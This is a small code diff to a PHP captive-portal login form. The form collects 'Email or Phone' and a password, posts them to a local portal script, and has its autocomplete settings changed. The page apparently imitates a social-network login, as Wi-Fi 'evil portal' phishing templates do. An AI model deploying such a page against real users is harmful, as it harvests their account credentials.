@@ -168,10 +168,10 @@ require_once('helper.php');
         <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
 
             <input type="hidden" name="target" value="<?=$destination?>">
-            <label><input type="text" name="email" required placeholder="Email or Phone"></label>
-            <label><input type="password" name="password" required placeholder="Password"></label>
+            <label><input type="text" name="email" placeholder="Email or Phone" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
+            <label><input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
             <input type="submit" value="Log In">
-              
+
         </form>
 
       <h5><a href="#">Forgot account?</a></h5>
